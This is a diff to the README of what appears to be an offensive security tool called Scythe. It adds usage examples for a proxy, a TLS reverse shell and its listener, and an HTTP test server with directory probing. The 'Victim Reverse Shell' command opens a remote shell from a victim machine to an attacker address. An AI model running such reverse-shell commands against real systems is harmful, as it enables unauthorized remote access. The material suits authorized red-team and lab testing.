@@ -89,7 +89,37 @@ root
 * Proxy server
 
 ```
-./Scythe Proxy --port 9050 
+./Scythe Proxy --port 9050
 ```
 
+* Victim Reverse Shell
 
+```
+./Scythe.exe Netcat --address 10.10.10.10 --reverse --port 8000 --proxy 172.17.0.2 --tls
+```
+
+* Attacker
+
+```
+./ScytheLinux Netcat --listen --port 8000 --tls
+```
+
+## HTTP
+
+### HTTP Test Server
+
+* Use this to test your HTTP requests.
+
+```
+virtualenv -p python3 ~/development/virtual_env/flask
+source ~/development/virtual_env/flask/bin/activate
+pip install flask
+python3 -m http.server
+```
+
+* Use this command to test different requests
+* Spin up a Listener and Proxy if you want to test those features
+
+```
+./Scythe Http --method GET --timeout 5s --url http://127.0.0.1:5000 --directories /index.js,/index.html,/first-dir/index.js,/first-dir/index.html,/command.js,/server.py,/first-dir/dir.js/server.py,/requirements.py
+```
